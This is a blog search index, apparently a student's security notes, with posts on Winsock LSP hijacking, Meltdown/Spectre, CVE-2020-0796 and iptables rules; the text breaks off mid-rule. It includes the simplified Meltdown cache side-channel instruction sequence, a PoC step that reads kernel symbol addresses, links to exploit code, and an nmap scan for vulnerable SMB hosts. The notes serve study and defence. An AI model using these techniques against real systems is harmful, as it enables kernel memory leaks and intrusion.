<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[lsp-hijack]]></title>
    <url>%2F2020%2F03%2F25%2Flsp-hijack%2F</url>
    <content type="text"><![CDATA[序原本只是想白嫖免费的腾讯加速器，用完卸了，没想到还卸载不了。 其中有两个dll删除时总是显示正在运行中，用tasklist /m xxx.dll查看运行dll的进程，一一终止，然后把他删了。 然后发现，我网络炸了？？？ ssr也被加速器顺便给炸了，显示绑定了另外一个端口 参考： 分层服务提供程序 LSP-wiki LSP劫持与网络数据转发代理服务器的心得笔记 Winsock LSP全称Windows Socket Layered Service Provider(分层服务提供商)，它是Windows底层网络Socker通信需要经过的大门。一些流氓软件可以把自已加进去，就可以截取、访问、修改网络的数据包，可以随意添加广告，还能获取你的浏览习惯.如果加进的是木马，后果可想而知。而且因为LSP工作在底层，所以无论你用什么浏览器，都逃不了经过它。而LSP中的dll文件被删除后，就会出现无法上网的情况。 Winsock LSP 可用于非常广泛的实用用途，包括 Internet 家长控制 (parental control) 和 Web 内容筛选。在以前版本的 Windows XP 中，删除不正确的（也称为“buggy”）LSP 可能会导致注册表中的 Winsock 目录损坏，潜在的导致所有网络连接的丢失。 LSP就是TCP/IP等协议的接口．LSP用在正途上可以方便程序员们编写监视系统网络通讯情况的Sniffer，可是现在常见的LSP都被用于浏览器劫持。 现在大多加速器，尤其以腾讯系为主的大多应用（腾讯加速器，TGP(现wegame)，都是以lsp劫持到自己的节点进行加速 非正常卸载(比如强行删除加速器文件)通常会带来无法上网的问题。 如何编写lsp劫持： https://blog.csdn.net/Aaron133/article/details/78028942 https://www.cnblogs.com/freesec/p/6541725.html https://www.cnblogs.com/hjbf/p/10195244.html https://blog.csdn.net/sspdfn/article/details/86520816 windows10 解决办法 1$ netsh winsock reset PS：用ping检查网络状况 12345ping 127.0.0.1(判断本地tcp/ip协议是否正常)，#ping 本地ip (判断网卡是否正常)，ping gateway_ip # 网关(判断路由器是否正常)，ping 14.215.177.39 # 外网ip，百度的ip (判断网络连接是否正常), ping baidu.com # 外网域名(判断DNS是否正常)，]]></content>
  </entry>
  <entry>
    <title><![CDATA[Meltdown And Hardware Security]]></title>
    <url>%2F2020%2F03%2F21%2FMeltdown-And-Hardware-Security%2F</url>
    <content type="text"><![CDATA[0x00 序由于新型冠状病毒，美股多次熔断，我们的安全课也提到了熔断一词：Meltdown，将其与硬件安全联系在了一起 Meltdown，源自于2018年1月3日的两组CPU芯片漏洞之一 2018年1月3日，Google Project Zero（GPZ）团队安全研究员Jann Horn在其团队博客中爆出CPU芯片的两组漏洞，分别是Meltdown与Spectre。 Meltdown对应CVE-2017-5754（乱序执行缓存污染），Spectre对应CVE-2017-5753（边界检查绕过）与CVE-2017-5715（分支目标注入）。看CVE编号就能知道，这两组漏洞早在2017年6月就已经由GPZ团队向英特尔提交，而在差不多时间由Lipp等人发布的论文Meltdown与Spectre Attacks也详细描述了这一攻击，从文中的声明来看，Lipp等人与GPZ团队似乎是独立发现了这两组漏洞。 Meltdown漏洞影响几乎所有的Intel CPU和部分ARM CPU，而Spectre则影响所有的Intel CPU和AMD CPU，以及主流的ARM CPU。从个人电脑、服务器、云计算机服务器到移动端的智能手机，都受到这两组硬件漏洞的影响。 总所周知，软件更换肯定比硬件更换容易，软件某个版本有了bug或漏洞，我们大可换其版本，重装就完事了，或者不用他且罢，但是对于硬件级的漏洞，我们也只能从软件层面修复打补丁，或者也就只能等着修复了漏洞的新版CPU发布了，不过换CPU也是一件麻烦事。 参考： Meltdown and Spectre Github - IAIK / meltdown Github - paboldin / meltdown-exploit Github - speed47 / spectre-meltdown-checker Meltdown.pdf——漏洞发现者的论文 Meltdown.pdf——论文翻译 一步一步理解CPU芯片漏洞：Meltdown与Spectre：其中分析的exp是这个Github - paboldin / meltdown-exploit Meltdown漏洞利用解读（Part 1）：基础篇 首发：Meltdown漏洞分析与实践 理解CPU Spectre漏洞 解读 Meltdown &amp; Spectre CPU 漏洞 给程序员解释Spectre和Meltdown漏洞 修复： 史上最大CPU漏洞Meltdown &amp; Spectre 影响与修复指南 0x01 漏洞原理计算机操作系统有一个最基本的安全目标：保证用户程序不能任意访问内核/其他用户程序的内存。一旦某个恶意应用可以任意访问其他应用程序/操作系统的内存，那么后果则不堪设想。 为了实现这个目标，操作系统和计算机硬件（CPU）采取了以下措施： 操作系统：通过虚拟内存为每个应用程序和内核开辟独立的地址空间，规定相应的访问权限。 CPU：通过硬件实现支持虚拟内存（TLB）及其相应的访问权限。 举例来讲，如果有一个用户程序试图访问一个内核的内存地址，那么在CPU执行相应指令的过程中会探测到没有访问权限，进而触发中断/异常，导致程序终结。 所以一般情况下，除非恶意程序通过软件漏洞提权获得了内核权限，否则是无论如何也绕不过CPU 的权限检查从而能访问内核地址的。 具体来看，假设非法访问内存的指令为 1mov rax byte[x] // 将内核地址x处的内容存到寄存器rax 操作系统会事先标注好内核的内存地址范围，如果 x 在内核的这个地址范围内，并且 CPU 不是以内核模式运行的话，那么该指令会被 CPU 标注为非法，引起异常，异常处理程序会将 rax 清空为0，并且终结此程序，这样后续指令再来读 rax 的时候就只能读到0了。目前看来这一整套流程还是无懈可击的。 然而这里一个重要的前提假设是：CPU 在做权限检查并且将 rax 清零的过程中，不会泄露任何关于 [x] 的信息。 一般的恶意攻击者，采用的是前一种方法进行攻击：提权，让CPU通过权限检查，然而Meltdown却另辟蹊径，在 rax 寄存器清零的过程中，采用了侧信道攻击获取信息 Meltdown和Spectre这两个漏洞利用了这个过程，他们来源于芯片厂商为了提高CPU性能而引入的两种特性：乱序执行（Out-of-Order Execution）和预测执行(Speculative Execution)。 乱序执行和预测执行乱序执行简单来说，现代CPU执行效率太高，但是内存访问端的速度跟不上，因此现代处理器为了提高性能并不严格按照指令的顺序串行执行，而是对执行进行相关性分析后并行处理乱序执行。比如当处理器中的某些指令需要等待某些资源，处理器不会真的在这里等待而停止指令的执行，而是利用等待资源的时间继续执行后续的指令。在支持乱序执行的CPU中，后面的指令可能在前面指令执行结束前就开始执行了。（两个漏洞的万恶之源） 但是为了保证程序运行的正确性，处理器会对指令执行安全检查，只有当前用户权限符合指令权限时才能被执行，比如用户空间的指令访问内核内存处理器就会抛出异常。然而安全检查这个操作只有在指令退休（retirement——一条指令退休只有当它的执行的结果真正被提交并对系统可见时才会发生）时才会进行。也就是说，如果在乱序执行中，指令并没有真正执行完成而只是加载到缓存中（下文会提）是不会执行安全检查的。而此时由于乱序执行而被提前执行的指令会被处理器丢弃，但由于乱序执行的指令对缓存的操作在这些指令被丢弃时不会被重置。正是安全检查与乱序执行的空窗期才会让Meltdown有机可乘。 预测执行预测执行涉及到程序的控制流，现在处理器不是去解析所有分支指令后然后决定执行哪个操作，而是预测哪个控制流会更有可能被运行再提取相应的指令代码执行。如果预测正确的话，会带来很高的性能提升并提高处理器的并行性。如果预测错误，那些被预测执行的不正确结果会被丢弃，处理器会将状态恢复到预测执行行前的正确状态，再重新跳转到正确执行的分支或指令中运行。与乱序执行类似，预测执行对处理器缓存的操作会被保留。 攻击这种机制从宏观上看似乎没什么问题，但由于处理器的缓存（cache）机制，那些被预测执行或乱序执行的指令会被先加载到缓存中，但在处理器恢复状态时并不会恢复处理器缓存的内容。而最新的研究表明攻击者可以利用缓存进行侧信道攻击，而Meltdown与Spectre从本质上来看属于利用处理器的乱序执行或预测执行漏洞进行的缓存侧信道攻击。 缓存侧信道攻击 缓存通过数据共享来加快数据访问，也就是说缓存命中与失效对应的响应时间是有差别的，攻击者正是利用这种时间的差异性来推测缓存中的信息，从而获得隐私数据。缓存侧信道攻击主要有Evict+Time[7]、Prime+Probe[6])与Flush+Reload[5]等攻击方式，这里主要简单介绍一下Flush+Reload，也是下文meltdown的exploit中利用的方法。 假设攻击者和目标程序共享物理内存（也可以是云中不同虚拟机共享内存），攻击者可以反复利用处理器指令将监控的内存块（某些地址）从缓存中驱逐出去，然后在等待目标程序访问共享内存（Flush阶段）。然后攻击者重新加载监控的内存块并测量读取时间(Reload阶段)，如果该内存块被目标程序访问过，其对应的内存会被导入到处理器缓存中，则攻击者对该内存的访问时间将会较短。通过测量加载时间的长短，攻击者可以清楚地知道该内存块是否被目标程序读取过。 Meltdown与Spectre利用这种侧信道可以进行越权内存访问，甚至读取整个内核的内存数据。 Meltdown攻击指令序列以一个简化的meltdown攻击指令序列为例 12345; rcx = kernel address; rbx = probe_arraymov rax, byte [rcx]shl rax, 0xcmov rbx, qword [rbx + rax] rcx为我们非法访问的内核地址，rcx寄存器存放用户空间程序不可访问的内核地址 rbx为我们用户空间中的一个数组，rbx寄存器指向探测数组probe_array mov des src，将src的数据移到des里，第三行的是尝试将内核地址中的一个字节移到rax寄存器中，是一个非法操作。该条指令视图访问内核地址，处理器会对其进行作安全检查，检查该进程是否有权限访问该地址。由于我们是以普通用户去执行的，因此这条指令会触发异常，该指令及之后的指令对寄存器的修改都会被丢弃，这样处理器能够回到正常执行的指令中，但由于处理器采用乱序执行的方式，在等待处理器完成该指令的同时（权限检查结束之前），后两条已经执行了，尽管他们都会被丢弃 shl des src，将src逻辑左移des位，这里将读到的数据乘以4096（4KB，0xC,正好为x86架构中的一个页的大小4KB） 第五行指令将上一条作为索引，对rbx探测数组进行探测，简单来说就是遍历这个数组。理论上讲，执行第四行指令时，rax就应该清零了，但是由于乱序执行，第四行和第五行的指令将会被执行，知道异常处理的时候，将 rbx 和 rax 清零。 目前看起来确实没啥问题，因为rbx也会清零，任何关于内核地址的信息都没有留下来。 但是问题的关键就在第三行指令：如果地址 rbx + rax 不在cache中的话，CPU 会自动将这一地址调入cache中，以便之后访问时获得更好的性能，然而异常处理并不会将这个cache flush掉。而这条 cache 的地址是和 rax 直接相关的，这样就相当于在 CPU 硬件中留下了和 rax 相关的信息。 那么如何还原 rbx + rax 这个被cache的地址呢？这时候需要用到的原理就是利用cache的访问延时，即已经被cache的数据访问时间短，没有被cache的数据访问时间长。由于rbx这个array是在用户地址空间内的，可以自由操作，首先我们要确保整个 rbx这个数组都是没有被cache的，然后执行上述攻击代码，这时候 rbx + rax 这个地址就已经被cache了，接下来遍历整个rbx 探测数组，来测量访问时间，访问时间最短的那个 page 就可以确定为 rbx + rax。（如下图，图来自原论文meltdown） 可以看到访问速度最快的，就是已经被cache到的内核地址空间中的一个字节byte，如此循环，即可获得全部内核空间的数据。 github中的PoC就是利用sudo cat /proc/kallsyms | grep “linux_proc_banner”获取linux_proc_banner在内核中的地址，再读取该地址上的值，去获取 /proc/version 的内容，证明漏洞存在 至于和meltdown同期的spectre漏洞，和 meltdown 的原理相似，利用分支预测错误的 speculative execution，访问到不该访问的信息，并且同样是通过 cache 这个side channel 传递出去。而且由于利用的分支预测原理普及率非常高，Spectre 的影响面更大一些。 具体的Meltdown的exploit分析可以看这篇文章：Meltdown_Exploit分析 我现在只是懂了他为什么这么做，但是我还想懂得他为什么会想到这么做（要去思考1.他做了什么2.他为什么这么做3.他为什么这样想4.忘了哪看到的逻辑层次(绝对不是百度搜出来的那个) //TODO libkdump这是作者开源出来的exp库，我们可以通过阅读(//TODO：等我对操作系统有着更深层次的理解时，来分析代码)并编译它，或者直接利用他编译后的库来使用 0x02 解决办法 Linux上现在提出的解决手段是KPTI（通用技术称为Kaiser），内核和用户态不共享页表，每次你异常、IO、系统调用，都要把内核页表重新装进来。https://lwn.net/Articles/738975/ windows已经推送漏洞更新了，在某个系统补丁里0.0 12345//以管理员权限打开powershell运行命令//可以看到提示Set-ExecutionPolicy BypassInstall-Module SpeculationControlGet-SpeculationControlSettings 其余可参见文章：史上最大CPU漏洞Meltdown &amp; Spectre 影响与修复指南 0x03 漏洞危害Meltdown与Spectre本质上都是基于缓存侧信道的攻击。 Meltdown与Spectre主要用于信息泄露，并不能对目标内存地址进行任意修改。攻击者必须要有执行权限才能进行攻击，对于一般用户只要不被执行恶意代码（比如访问恶意网站），就不会被Meltdown与Spectre攻击。但是在云端，攻击者可以租赁虚拟机来执行攻击者想要执行的任意代码，从而获取宿主物理机以及其它租户的信息，这对云服务商的冲击还是非常大的。 文中关于exp的思考问题： 值得进一步思考的问题 该利用代码一次只能探测一个字节的数据，如果在内核数据还没读取完整之前处理器已经处理异常了该怎么办？个人认为：觉得应该可以多次探测，不是每次都能这么快处理异常的 探测数组target_array是否可以不用设置成256*4KB，设置成512*2KB，1024*1KB效果会如何？个人认为：应该是可以的，但是感觉效率没有256 * 4KB的效率高 探测数组target_array是个大数组，占用多个内存页面，是否容易被检测到？个人认为：应该是不容易被检测到的，切换页面也需要时间，占多个页面导致效率大大降低]]></content>
      <categories>
        <category>Hardware</category>
        <category>Security</category>
        <category>CPU</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>hardware</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2020-0796]]></title>
    <url>%2F2020%2F03%2F16%2FCVE-2020-0796%2F</url>
    <content type="text"><![CDATA[details about new SMB wormable bug leak: ADV200005 | Microsoft Guidance for Disabling SMBv3 Compression Microsoft patches SMBv3 wormable bug that leaked earlier this week CVE-2020-0796相关信息（smbv3漏洞检测工具）： nikallass / check-smb-v3.11.sh ：linux下的检测脚本 Scanner for CVE-2020-0796 - SMBv3 RCE ： 基于python3的检测脚本 vimeo 视频演示 CVE-2020-0796相关分析信息： SMBGhost – Analysis of CVE-2020-0796 微软SMBv3客户端/服务端远程代码执行漏洞（CVE-2020-0796）技术分析 CVE-2020-0796-PoC： PoC for triggering buffer overflow via CVE-2020-0796 概述exp报告可以看这个文档 ，虽然Windows defender没有直接删除，但是当内容保存时，提示我需要发到远端服务器判断，看来windows defender还是挺靠谱的 3.12爆出的漏洞，3.18公布exp windows SMB 3使用说明： https://docs.microsoft.com/zh-cn/windows-server/storage/file-server/file-server-smb-overview 受影响的系统12345678+ Windows 10 Version 1903 for 32-bit Systems+ Windows 10 Version 1903 for ARM64-based Systems+ Windows 10 Version 1903 for x64-based Systems+ Windows 10 Version 1909 for 32-bit Systems+ Windows 10 Version 1909 for ARM64-based Systems+ Windows 10 Version 1909 for x64-based Systems+ Windows Server, version 1903 (Server Core installation)+ Windows Server, version 1909 (Server Core installation) POC 检查本地计算机上的活动SMB连接版本（Windows 8及更高版本） Powershell.exe-&gt; Get-SMBConnection这仅显示当前打开的SMB连接 Nmap扫描以检查支持的SMB协议版本nmap -p445 --script smb-protocols &lt;目标主机/子网&gt; | grep -P&#39;\ d + \。\ d + \。\ d + \。\ d + | ^ \ |。\ s + 3.11&#39; 漏洞分析]]></content>
      <categories>
        <category>CVE</category>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iptables]]></title>
    <url>%2F2020%2F03%2F16%2Fiptables%2F</url>
    <content type="text"><![CDATA[iptables 参考： iptables - Linux man page iptables_command iptables详解 iptables详解 iptables详解及一些常用规则 简介netfilter/iptables（简称为iptables）组成Linux平台下的包过滤防火墙，与大多数的Linux软件一样，这个包过滤防火墙是免费的，它可以代替昂贵的商业防火墙解决方案，完成封包过滤、封包重定向和网络地址转换（NAT）等功能。 iptables分为2部分，一部分位于内核中，用来存放规则，称为NetFilter。还有一段在用户空间中，用来定义规则，并将规则传递到内核中，这段在用户空间中的程序就叫做iptables。 所以对于用户空间来说，就是按照需要生成一条条规则，然后向内核中提交，存放到NetFilter，让这些规则在数据传输与处理的过程中起作用。形象化地理解来说就是，把iptables看作是一个客户端代理，用户通过iptables这个代理，与内核中的安全框架netfilter进行交互。netfilter才是防火墙真正的安全框架，处于内核空间内。 Netfilter是linux操作系统核心层内部的一个数据包处理模块，拥有如下功能： 网络地址转换(Network Address Translate) 数据包内容修改 数据包过滤的防火墙功能 链iptables开启后，数据报文从进入服务器到出来经过5条链，分别为 prerouting 、 input 、output 、 forward 、 postrouting 如下图，即数据报文的可能经过的路径 每条链上设有多种规则，数据报文必须按照顺序一个个匹配这些规则 正如图中，数据报文经过的5条链上，必须逐一经过每一条链，而在链上，数据报文必须逐一通过(符合)每一个规则的限制，方能到下一条链上 INPUT链：当接收到防火墙本机地址的数据包(入站)时，应用此链的规则 OUTPUT链：当防火墙本机向外发送数据包(出站)时，应用此链的规则 FORWARD链：当接收到需要通过防火墙发送给其他地址的数据包(转发)时，应用此链的规则 PREROUTING链：在对数据包作路由选择之前，应用此链的规则，如DNAT POSTROUTING链：在对数据包作路由选择之后，应用此链的规则，如SNAT 在链的第一张图中，我们可以形象地看出数据包在哪些条件下需要经过哪些链 input和output链更多应用在主机防火墙中，主要针对本机进出的数据安全控制，而prerouting、postrouting、forward链更多应用在网络防火墙中，特别是防火墙服务器作为网关时使用的情况 表的概念虽然一条链上有多条规则，但是基于某些规则的作用功能很相似，因此有多个相似功能的规则组成了表，iptables为我们提供了四种表 filter表：主要用于对数据包进行过滤，根据具体的规则决定是否放行该数据包(如DROP、ACCEPT 、REJECT 、 LOG )，所谓防火墙其实基本上是指这张表上的过滤规则，对应内核模块的iptables_filter nat表：Network Address Translation，网络地址转换功能，主要用于修改数据包的ip地址、端口号信息等 ( 如 SNAT 、 DNAT 、 MASQUERADE 、REDIRECT )。属于一个流的包只会经过这个表一次，如果第一个包被允许做NAT或Masqueraded，那么余下的包都会自动做相同的操作，对应内核模块的iptables_nat mangle表：拆解报文，做出修改，并重新封装，主要用于修改数据包的TOS(Type of Service，服务类型)、TTL( Time To Live，生存周期)以及为数据包设置Mark标记，以实现QoS(Quality Of Service ，服务质量)调整以及策略路由等应用，由于需要相应的路由设备支持，因此应用并不广泛，对应内核模块iptables_mangle raw表：从iptables 1.2.9版本后新添加的表，主要用于决定数据包是否被状态跟踪机制处理，在匹配数据包时，raw表规则要有优先于其他表，对应内核模块iptables_raw 我们自定义的所有规则，都会添加到四张表中的其中一张表中 规则表之间的优先顺序：Raw &gt;&gt; mangle &gt;&gt; nat &gt;&gt; filter 表链关系5条链中，并不是每条链都能应用所有类型的表，事实上除了Output链上能同时拥有四种表以外，其他都只能有两到三种表 上图即为每种链能应用的表，实际上，在各表中还有匹配顺序，每条链上的各个表的匹配顺序为：raw &rarr; mangle &rarr; nat &rarr; filter 把上图转换成表，可直观地看出来，表链的关系 raw mangle nat filter prerouting 1 1 1 0 input 0 1 1 1 forward 0 1 0 1 output 1 1 1 1 postrouting 0 1 0 1 数据包通过防火墙流程可以总结如下： 规则的概念iptables规则主要包含了“条件&amp;动作”，即匹配出符合什么条件(规则)后，对它采取怎样的动作 匹配条件 S_IP：source ip，即源ip S_PORT：source port，源端口 D_IP：destination ip，目标ip D_PORT：destination port，目标端口 TCP/UDP：第四层协议(传输层) 处理的动作 ACCEPT：允许数据包通过 DROP：直接丢弃数据包，不回应任何信息，客户端只有当该链超时后才会有反应 REJECT：拒绝数据包，会给客户端发送一个数据包被丢弃的相应信息 SNAT：S指Source，源NAT（源地址转换），再进入路由层面的route之后，出本地的网络线之前，改写源地址，目标地址不变，并在本机建立NAT表项，当数据返回时，根据NAT表将目的地址数据改写为数据发送出去的源地址，并发给主机，解决私网用户用同一个公网ip上网的问题 MASQUERADE：是SNAT的一种特殊形式，适用于动态的、临时会变的IP上； DNAT：D指Destination，目的NAT，解决私网服务端，接收公网请求的问题。和SNAT相反，IP包经过route之前，重新修改目标地址，源地址不变，在本机建立NAT表项，当数据返回时，根据NAT表将源地址修改为数据发送过来时的目标地址，并发给远程主机。可以隐藏后端服务器的真实地址 REDIRECT：在本机做端口映射； LOG：在/var/log/messages文件中记录日志信息，然后将数据包传递给下一条规则 除去最后一个LOG，前三条规则匹配数据包后，该数据包就不会再往下继续匹配了，所以编写规则的顺序极其关键 关于DNAT和SNAT： https://blog.51cto.com/sxj007/110924 简单来说，SNAT是替换接收到的数据包的源地址，一般用在postrouting 而DNAT是替换数据包中的目的地址，一般用在prerouting 命令有关 iptables 的命令可以用下图来解释 1$ iptables [-t table_name] command [chain_name] [parameter] [-j target&amp;action] parameter 是用于条件匹配 所有表名必须小写 filter / nat / mangle / raw 所有链名必须大写 INPUT / OUTPUT / FORWARD / PREROUTING / POSTROUTING 所有匹配必须小写 -s / -d / -m &lt;module_name&gt; / -p 所有动作必须大写 ACCEPT / DROP / SNAT / DNAT / MASQUERADE 对于parameter条件匹配，如下图所示： 对于Command选项：-A 在指定链末尾添加(append)一条新规则 -D 删除（delete）指定链中的某一条规则，可以按规则序号和内容删除 -I 在指定链中插入（insert）一条新的规则，默认在第一行添加 -R 修改、替换（replace）指定链中的某一条规则，可以按规则序号和内容替换 -L 列出（list）指定链中所有的规则进行查看 -E 重命名用户定义的链，不改变链本身 -F 清空（flush） -N 新建（new-chain）一条用户自己定义的规则链 -X 删除指定表中用户自定义的规则链（delete-chain） -P 设置指定链的默认策略（policy） -Z 将所有表的所有链的字节和数据包计数器清零 -n 使用数字形式（numeric）显示输出结果 -v 查看规则表详细信息（verbose）的信息 -V 查看版本(version) -h 获取帮助（help） 打开linux转发功能：echo 1 &gt; /proc/sys/net/ipv4/ip_forward 删除input链的第一条规则：iptables -D INPUT 1 iptables防火墙常用的策略123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# 1.拒绝进入防火墙的所有ICMP协议数据包$ iptables -I INPUT -p icmp -j REJECT# 2.允许防火墙转发除ICMP协议以外的所有数据包# 说明：使用“！”可以将条件取反。$ iptables -A FORWARD -p ! icmp -j ACCEPT# 3.拒绝转发来自192.168.1.10主机的数据，允许转发来自192.168.0.0/24网段的数据# 说明：注意要把拒绝的放在前面,不然拒绝语句就没有用了就不起作用了啊。$ iptables -A FORWARD -s 192.168.1.11 -j REJECT$ iptables -A FORWARD -s 192.168.0.0/24 -j ACCEPT# 4.丢弃从外网接口（eth1）进入防火墙本机的源地址为私网地址的数据包$ iptables -A INPUT -i eth1 -s 192.168.0.0/16 -j DROP$ iptables -A INPUT -i eth1 -s 172.16.0.0/12 -j DROP$ iptables -A INPUT -i eth1 -s 10.0.0.0/8 -j DROP# 5.封堵网段（192.168.1.0/24），两小时后解封。# 说明：这个策略咱们借助crond计划任务来完成，就再好不过了。$ iptables -I INPUT -s 10.20.30.0/24 -j DROP$ iptables -I FORWARD -s 10.20.30.0/24 -j DROP$ at now 2 hours at&gt; iptables -D INPUT 1 at&gt; iptables -D FORWARD 1[1] Stopped at now 2 hours# 6.只允许管理员从202.13.0.0/16网段使用SSH远程登录防火墙主机。# 说明：这个用法比较适合对设备进行远程管理时使用# 比如位于分公司中的SQL服务器需要被总公司的管理员管理时。$ iptables -A INPUT -p tcp --dport 22 -s 202.13.0.0/16 -j ACCEPT$ iptables -A INPUT -p tcp --dport 22 -j DROP# 7.允许本机开放从TCP端口20-1024提供的应用服务。$ iptables -A INPUT -p tcp --dport 20:1024 -j ACCEPT$ iptables -A OUTPUT -p tcp --sport 20:1024 -j ACCEPT# 8.允许转发来自192.168.0.0/24局域网段的DNS解析请求数据包。$ iptables -A FORWARD -s 192.168.0.0/24 -p udp --dport 53 -j ACCEPT$ iptables -A FORWARD -d 192.168.0.0/24 -p udp --sport 53 -j ACCEPT# 9.禁止其他主机ping防火墙主机，但是允许从防火墙上ping其他主机$ iptables -I INPUT -p icmp --icmp-type Echo-Request -j DROP$ iptables -I INPUT -p icmp --icmp-type Echo-Reply -j ACCEPT$ iptables -I INPUT -p icmp --icmp-type destination-Unreachable -j ACCEPT# 10.禁止转发来自MAC地址为00：0C：29：27：55：3F的和主机的数据包# 说明：iptables中使用“-m 模块关键字”的形式调用显示匹配。这里用“-m mac –mac-source”来表示数据包的源MAC地址。$ iptables -A FORWARD -m mac --mac-source 00:0c:29:27:55:3F -j DROP# 11.允许防火墙本机对外开放TCP端口20、21、25、110以及被动模式FTP端口1250-1280# 说明：这里用“-m multiport –dport”来指定目的端口及范围$ iptables -A INPUT -p tcp -m multiport --dport 20,21,25,110,1250:1280 -j ACCEPT# 12.禁止转发源IP地址为192.168.1.20-192.168.1.99的TCP数据包。# 说明：此处用“-m –iprange –src-range”指定IP范围。$ iptables -A FORWARD -p tcp -m iprange --src-range 192.168.1.20-192.168.1.99 -j DROP# 13.禁止转发与正常TCP连接无关的非—syn请求数据包。# 说明：“-m state”表示数据包的连接状态，“NEW”表示与任何连接无关的，新的嘛！$ iptables -A FORWARD -m state --state NEW -p tcp ! --syn -j DROP# 14.拒绝访问防火墙的新数据包，但允许响应连接或与已有连接相关的数据包# 说明：“ESTABLISHED”表示已经响应请求或者已经建立连接的数据包# “RELATED”表示与已建立的连接有相关性的，比如FTP数据连接等。$ iptables -A INPUT -p tcp -m state --state NEW -j DROP$ iptables -A INPUT -p tcp -m state --state ESTABLISHED,RELATED -j ACCEPT# 15.只开放本机的web服务（80）、FTP(20、21、20450-20480)，放行外部主机发住服务器其它端口的应答数据包，将其他入站数据包均予以丢弃处理。$ iptables -I INPUT -p tcp -m multiport --dport 20,21,80 -j ACCEPT$ iptables -I INPUT -p tcp --dport 20450:20480 -j ACCEPT$ iptables -I INPUT -p tcp -m state --state ESTABLISHED -j ACCEPT$ iptables -P INPUT DROP 常用iptables规则123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136# 1. 删除所有现有规则$ iptables -F# 2. 设置默认的 chain 策略$ iptables -P INPUT DROP$ iptables -P FORWARD DROP$ iptables -P OUTPUT DROP# 3. 阻止某个特定的 IP 地址$ BLOCK_THIS_IP="x.x.x.x"$ iptables -A INPUT -s "$BLOCK_THIS_IP" -j DROP# 4. 允许全部进来的（incoming）SSH$ iptables -A INPUT -i eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT$ iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT# 5. 只允许某个特定网络进来的 SSH$ iptables -A INPUT -i eth0 -p tcp -s 192.168.200.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT$ iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT# 6. 允许进来的（incoming）HTTP$ iptables -A INPUT -i eth0 -p tcp --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT$ iptables -A OUTPUT -o eth0 -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT# 7. 多端口（允许进来的 SSH、HTTP 和 HTTPS）$ iptables -A INPUT -i eth0 -p tcp -m multiport --dports 22,80,443 -m state --state NEW,ESTABLISHED -j ACCEPT$ iptables -A OUTPUT -o eth0 -p tcp -m multiport --sports 22,80,443 -m state --state ESTABLISHED -j ACCEPT# 8. 允许出去的（outgoing）SSH$ iptables -A OUTPUT -o eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT$ iptables -A INPUT -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT# 9. 允许外出的（outgoing）SSH，但仅访问某个特定的网络$ iptables -A OUTPUT -o eth0 -p tcp -d 192.168.101.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT$ iptables -A INPUT -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT# 10. 允许外出的（outgoing） HTTPS$ iptables -A OUTPUT -o eth0 -p tcp --dport 443 -m state --state NEW,ESTABLISHED -j ACCEPT$ iptables -A INPUT -i eth0 -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT# 11. 对进来的 HTTPS 流量做负载均衡$ iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 0 -j DNAT --to-destination 192.168.1.101:443$ iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 1 -j DNAT --to-destination 192.168.1.102:443$ iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 2 -j DNAT --to-destination 192.168.1.103:443# 12. 从内部向外部 Ping$ iptables -A OUTPUT -p icmp --icmp-type echo-request -j ACCEPT$ iptables -A INPUT -p icmp --icmp-type echo-reply -j ACCEPT# 13. 从外部向内部 Ping$ iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT$ iptables -A OUTPUT -p icmp --icmp-type echo-reply -j ACCEPT# 14. 允许环回（loopback）访问$ iptables -A INPUT -i lo -j ACCEPT$ iptables -A OUTPUT -o lo -j ACCEPT# 15. 允许 packets 从内网访问外网# if eth1 is connected to external network (internet)# if eth0 is connected to internal network (192.168.1.x)$ iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT# 16. 允许外出的 DNS$ iptables -A OUTPUT -p udp -o eth0 --dport 53 -j ACCEPT$ iptables -A INPUT -p udp -i eth0 --sport 53 -j ACCEPT# 17. 允许 NIS 连接$ rpcinfo -p | grep ypbind ; This port is 853 and 850$ iptables -A INPUT -p tcp --dport 111 -j ACCEPT$ iptables -A INPUT -p udp --dport 111 -j ACCEPT$ iptables -A INPUT -p tcp --dport 853 -j ACCEPT$ iptables -A INPUT -p udp --dport 853 -j ACCEPT$ iptables -A INPUT -p tcp --dport 850 -j ACCEPT$ iptables -A INPUT -p udp --dport 850 -j ACCEPT# 18. 允许某个特定网络 rsync 进入本机$ iptables -A INPUT -i eth0 -p tcp -s 192.168.101.0/24 --dport 873 -m state --state NEW,ESTABLISHED -j ACCEPT$ iptables -A OUTPUT -o eth0 -p tcp --sport 873 -m state --state ESTABLISHED -j ACCEPT# 19. 仅允许来自某个特定网络的 MySQL 的链接$ iptables -A INPUT -i eth0 -p tcp -s 192.168.200.0/24 --dport 3306 -m state --state NEW,ESTABLISHED -j ACCEPT$ iptables -A OUTPUT -o eth0 -p tcp --sport 3306 -m state --state 